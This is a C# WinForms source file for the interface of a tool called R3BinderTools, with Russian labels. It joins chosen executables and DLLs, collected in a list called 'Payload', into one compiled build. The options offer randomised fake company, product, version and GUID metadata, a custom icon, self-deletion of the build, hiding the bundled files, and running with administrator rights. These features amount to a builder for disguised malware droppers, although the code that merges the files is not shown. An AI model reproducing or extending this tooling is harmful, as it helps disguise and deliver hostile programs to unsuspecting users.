namespace R3BinderTools.Compilation.CodeDOM
{
    using System;
    using System.Collections.Generic;
    using System.Drawing;
    using System.IO;
    using System.Linq;
    using System.Threading.Tasks;
    using System.Windows.Forms;

    using Design;
    using GenTools;
    using Helpers;

    public partial class MultiBinderFrm : UserControl
    {
        public MultiBinderFrm()
        {
            InitializeComponent();
            this.MenuFiles.Renderer = new ToolStripProfessionalRenderer(new MenuPalette());
            this.AssVerTextBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.AssFileVerTextBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            DragEnter += new DragEventHandler(ListFiles_DragEnter);
            DragDrop += new DragEventHandler(ListFiles_DragDrop);
        }
        protected void TextBoxOnTextChanged(object sender, KeyPressEventArgs e)
        {
            char number = e.KeyChar;
            if (!char.IsDigit(number) && number != 8 && number != 46)
                e.Handled = true;
        }
        private void MultiBinderFrm_Load(object sender, EventArgs e)
        {
            this.ListFiles.AllowDrop = true;
        }
        private void AddFileItem_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            this.CountFiles.Focus();

            using var ofd = new OpenFileDialog
            {
                Title = "Выберите файл, который хотите соединить",
                Filter = "Все файлы (*.*)|*.*|exe файлы|*.exe;|dll файлы|*.dll;",
                AutoUpgradeEnabled = true,
                CheckFileExists = true,
                Multiselect = true,
                RestoreDirectory = true
            };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                foreach (string multi in ofd.FileNames)
                {
                    if (!this.ListFiles.Items.Contains(multi))
                    {
                        this.ListFiles.Items.Add(multi);
                        this.CountFiles.Text = $"Список файлов для соединения: {this.ListFiles.Items.Count}";
                    }
                    else
                    {
                        StatusCompile.Location = new Point(482, 391); 
                        ControlActive.CheckMessage(StatusCompile, "Такой файл уже есть в списке", Color.YellowGreen, 5000);
                    }
                }
            }
        }
        private void RemoveFileItem_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            this.CountFiles.Focus();

            if (this.ListFiles.SelectedIndex != -1)
            {
                this.ListFiles.Items.RemoveAt(this.ListFiles.SelectedIndex);
                this.CountFiles.Text = $"Список файлов для соединения: {this.ListFiles.Items.Count}";
            }
            else
            {
                StatusCompile.Location = new Point(456, 391);
                ControlActive.CheckMessage(StatusCompile, "Выберите элемент из списка для удаления.", Color.YellowGreen, 5000);
            }
        }
        private void CleanAllItems_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            this.CountFiles.Focus();
            this.ListFiles.Items.Clear();
            this.CountFiles.Text = $"Список файлов для соединения: {this.ListFiles.Items.Count}";
        }
        private void AddIcoBox_CheckedChanged(object sender, EventArgs e)
        {
            if (AddIcoBox.Checked == true)
            {
                using var ofd = new OpenFileDialog
                {
                    Title = "Выберите иконку для билд файла",
                    Filter = "Icon|*.ico",
                    AutoUpgradeEnabled = true,
                    CheckFileExists = true,
                    RestoreDirectory = true
                };
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (File.Exists(ofd.FileName))
                    {
                        this.IconTextBox.Text = ofd.FileName;
                        this.IcoViewer.ImageLocation = this.IconTextBox.Text;
                        this.IcoViewer.BorderStyle = BorderStyle.None;
                        this.LsizeIco.Visible = true;
                        this.LsizeIco.Text = $"Размер иконки: {GetFileSize.Inizialize(new FileInfo(this.IconTextBox.Text).Length)}";
                    }
                    else
                    {
                        this.IcoViewer.BorderStyle = BorderStyle.FixedSingle;
                        this.IconTextBox.Clear();
                        AddIcoBox.Checked = false;
                        this.LsizeIco.Visible = false;
                        this.StatusCompile.Location = new Point(497, 392);
                        ControlActive.CheckMessage(this.StatusCompile, "Иконка повреждена, выберите другую", Color.YellowGreen, 5000);
                    }
                }
                else
                {
                    this.IcoViewer.BorderStyle = BorderStyle.FixedSingle;
                    this.IconTextBox.Clear();
                    AddIcoBox.Checked = false;
                    this.LsizeIco.Visible = false;
                }
            }
            else
            {
                this.IcoViewer.BorderStyle = BorderStyle.FixedSingle;
                this.IconTextBox.Clear();
                this.IcoViewer.Image = null;
                this.LsizeIco.Visible = false;
            }
        }
        private void ListFiles_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string file in files)
            {
                if (!this.ListFiles.Items.Contains(file))
                {
                    this.ListFiles.Items.Add(file);
                    this.CountFiles.Text = $"Список файлов для соединения: {this.ListFiles.Items.Count}";
                }
                else
                {
                    StatusCompile.Location = new Point(482, 391); 
                    ControlActive.CheckMessage(StatusCompile, "Такой файл уже есть в списке", Color.YellowGreen, 5000);
                }
            }
        }
        private void ListFiles_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop, false) == true)
            {
                e.Effect = DragDropEffects.Move;
            }
        }
        private void AdmRunBuildBox_CheckedChanged(object sender, EventArgs e)
        {
            if (AdmRunBuildBox.Checked == true)
            {
                if (!File.Exists(GlobalPath.ManifestFile))
                {
                    try
                    {
                        File.WriteAllBytes(GlobalPath.ManifestFile, Properties.Resources.app);
                    }
                    catch { }
                }
            }
            else
            {
                if (File.Exists(GlobalPath.ManifestFile))
                {
                    try
                    {
                        File.Delete(GlobalPath.ManifestFile);
                    }
                    catch { }
                }
            }
        }

        // Проверка всех текстбоксов на пустоту за исключением для this.IconTextBox 
        private bool CheckIsEmptyBoxs() => this.Controls.OfType<TextBox>().Except(new TextBox[] { this.IconTextBox }).Any(t => string.IsNullOrEmpty(t.Text));
        private void AutoGenAss_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            this.CountFiles.Focus();

            this.AssProductTextBox.Text = GenX.GetUpdate();
            this.AssTitleTextBox.Text = GenX.GenerateIdentifier(15);
            this.AssDescriptTextBox.Text = GenX.GenerateIdentifier(15);
            this.AssCompanyTextBox.Text = GenX.GetUpdate();
            this.AssCopyrightTextBox.Text = GenX.GenerateIdentifier(15);
            this.AssVerTextBox.Text = Convert.ToString($"{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}");
            this.AssFileVerTextBox.Text = Convert.ToString($"{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}.{GenX.Next(10)}");
            this.AssGuidTextBox.Text = Guid.NewGuid().ToString();
        }
        private void CreateBuild_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            this.CountFiles.Focus();

            if (this.ListFiles.Items.Count <= 0)
            {
                this.StatusCompile.Location = new Point(497, 392);
                ControlActive.CheckMessage(this.StatusCompile, "Добавьте файлы в список", Color.YellowGreen, 5000);
            }
            else
            {
                if (CheckIsEmptyBoxs())
                {
                    this.StatusCompile.Location = new Point(500, 392);
                    ControlActive.CheckMessage(this.StatusCompile, "Заполните все данные", Color.YellowGreen, 5000);
                }
                else
                {
                    // Хранилище наших файлов
                    List<string> Payload = new List<string>();

                    foreach (string payload in this.ListFiles.Items)
                    {
                        Payload?.Add(payload);
                    }
                    var contents = new BuildDom()
                    {
                        AssTitle = AssTitleTextBox.Text,
                        AssCompany = AssCompanyTextBox.Text,
                        AssCopyright = AssCopyrightTextBox.Text,
                        AssDescription = AssDescriptTextBox.Text,
                        AssFileVersion = AssFileVerTextBox.Text,
                        AssProduct = AssProductTextBox.Text,
                        AssVersion = AssVerTextBox.Text,
                        GuidBox = AssGuidTextBox.Text,
                        IconCheckBox = AddIcoBox,
                        BoxIconPath = IconTextBox.Text,
                        SuicideBox = SuicideBuildBox,
                        AdminBuildBox = AdmRunBuildBox,
                        RunTime = RunTimeBox,
                        HideResources = HideFilesBox,
                        AdminFilesBox = AdmRunFilesBox,
                        LMessage = StatusCompile
                    };
                    // Запускаем задачу создания билда с передачей параметров для замены текста с ожиданием
                    Task.Run(() => SourceEditor.Inizialize(contents, Payload)).ConfigureAwait(false).GetAwaiter();
                }
            }
        }
    }
}